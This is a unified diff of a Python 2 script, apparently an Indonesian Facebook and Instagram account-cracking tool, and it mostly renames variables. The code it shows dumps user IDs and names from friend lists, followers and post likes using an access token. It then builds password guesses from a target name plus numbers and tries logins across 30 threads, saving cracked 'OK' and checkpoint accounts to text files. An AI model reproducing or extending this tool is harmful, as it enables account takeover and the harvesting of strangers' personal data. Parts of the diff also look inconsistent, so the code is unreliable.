@@ -131,10 +131,10 @@ def publik(romz,headers=header):
         z = json.loads(r.text)
         for a in z['friends']['data']:
             id.append(a['id'] + '<=>' + a['name'])
-            aang.write(a['id'] + '<=>' + a['name'] + '\n')
+            bff.write(a['id'] + '<=>' + a['name'] + '\n')
             print '\r%s╚══[•] sabar sedang dump id :%s %s ' % (P,H,str(len(id))),
             sys.stdout.flush();jeda(0.0050)
-        aang.close()
+        bff.close()
         print ('\n \n%s╔══[%s✓%s] Succes dump id dari %s%s'%(P,H,P,H,nm['name']))
         print ('%s╠══[%s•%s] Salin file dump nya :%s %s '%(P,H,P,H,file))
         raw_input('\n%s╚══[ %Enter %s] '%(P,K,P))
@@ -153,15 +153,15 @@ def followers(romz,headers=header):
         gas = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt,romz))
         nm = json.loads(gas.text)
         file = ('dump/'+nm['first_name']+'.json').replace(' ', '_')
-        aang = open(file, 'w')
+        bff = open(file, 'w')
         r = requests.get('https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s'%(idt,batas,romz))
         z = json.loads(r.text)
         for a in z['data']:
             id.append(a['id'] + '<=>' + a['name'])
-            aang.write(a['id'] + '<=>' + a['name'] + '\n')
+            bff.write(a['id'] + '<=>' + a['name'] + '\n')
             print '\r%s╚══[•] sabar sedang dump id :%s %s ' % (P,H,str(len(id))),
             sys.stdout.flush();jeda(0.0050)
-        aang.close()
+        bff.close()
         print ('\n\n%s╔══[%s✓%s] Succes dump id dari %s%s'%(P,H,P,H,nm['name']))
         print ('%s╠══[%s+%s] Salin file dump nya :%s %s '%(P,H,P,H,file))
         raw_input('%s╚══[ %sEnter %s] '%(P,K,P))
@@ -181,13 +181,13 @@ def postingan(romz,headers=header):
         id = []
         z = json.loads(r.text)
         file = ('dump/' + simpan + '.json').replace(' ', '_')
-        aang = open(file, 'w')
+        bff = open(file, 'w')
         for a in z['data']:
             id.append(a['id'] + '<=>' + a['name'])
-            aang.write(a['id'] + '<=>' + a['name'] + '\n')
+            bff.write(a['id'] + '<=>' + a['name'] + '\n')
             print '\r%s╚══[•] sabar sedang dump id :%s %s ' % (P,H,str(len(id))),
             sys.stdout.flush();jeda(0.0050)
-        aang.close()
+        bff.close()
         print ('\n\n%s╔══[%s✓%s] Succes dump id postingan '%(P,H,P))
         print ('%s╠══[%s+%s] Salin file dump nya :%s %s '%(P,H,P,H,file))
         raw_input('\n%s╚══[ %sEnter %s] '%(P,K,P))
@@ -199,7 +199,7 @@ class ngentod:
 
     def __init__(self):
         self.id = []
-    def aangxd(self):
+    def romiy(self):
         try:
             self.apk = raw_input('\n%s╔══[?] file dump :%s '%(P,K))
             self.id = open(self.apk).read().splitlines()
@@ -735,7 +735,7 @@ def hasill(c):
 		print "\n%s╔══[1] Hasil crack akun %sOK "%(P,H)
         print "%s╠══[2] Hasil crack akun %sCP "%(P,K)
         while True:
-        	ang= raw_input('%s╚══[•] Menu : %s'%(P,K))
+        	rom = raw_input('%s╚══[•] Menu : %s'%(P,K))
 		if rom in['1','01']:
 			try:
 				oke = open("okeh.txt", "r").readlines()
@@ -761,19 +761,19 @@ def hasill(c):
 		else:
 			exit()
 def igg():
-	print ("\n%s╔══[%s•%s] Contoh nama %s: %sjokowi "%(P,M,P,M,K))
-	usr_ = raw_input('%s╠══[?] Input nama : %s'%(P,K))
-	jumlah = input('%s╚══[?] Limit user : %s'%(P,K))
-	aang_ganteng= usr_.replace(" ", "")
+	print ("\n%s╔═[%s•%s] Contoh nama %s: %sjokowi "%(P,M,P,M,K))
+	usr_ = raw_input('%s╠═[?] Input nama : %s'%(P,K))
+	jumlah = input('%s╚═[?] Limit user : %s'%(P,K))
+	bff_2 = usr_.replace(" ", "")
 	cr.append("romi_afrizal")
-	mi.append(aang_ganteng+"|"+nisa_cans)
-	mi.append(aang_ganteng+"_"+"|"+nisa_cans)
+	mi.append(bff_2+"|"+bff_2)
+	mi.append(bff_2+"_"+"|"+bff_2)
 	for _i_ in range(1, jumlah+1):
-		mi.append(bff_2+str(_i_)+"|"+nisa_cans)
-		mi.append(bff_2+"_"+str(_i_)+"|"+nisa_cans)
-		mi.append(bff_2+str(_i_)+"_"+"|"+nisa_cans)
-	print '\n%s╔══[%s+%s] akun %sOK%s tersimpan di >%s okeh.txt'%(P,K,P,H,P,H);jeda(0.02)
-	print '%s╚══[%s+%s] akun %sCP %stersimpan di > %scepeh.txt\n'%(P,K,P,K,P,K);jeda(0.02)
+		mi.append(bff_2+str(_i_)+"|"+bff_2)
+		mi.append(bff_2+"_"+str(_i_)+"|"+bff_2)
+		mi.append(bff_2+str(_i_)+"_"+"|"+bff_2)
+	print '\n%s╔═[%s+%s] akun %sOK%s tersimpan di >%s okeh.txt'%(P,K,P,H,P,H);jeda(0.02)
+	print '%s╚═[%s+%s] akun %sCP %stersimpan di > %scepeh.txt\n'%(P,K,P,K,P,K);jeda(0.02)
 	with ThreadPoolExecutor(max_workers=30) as log:
 		for ro in mi:
 			try:
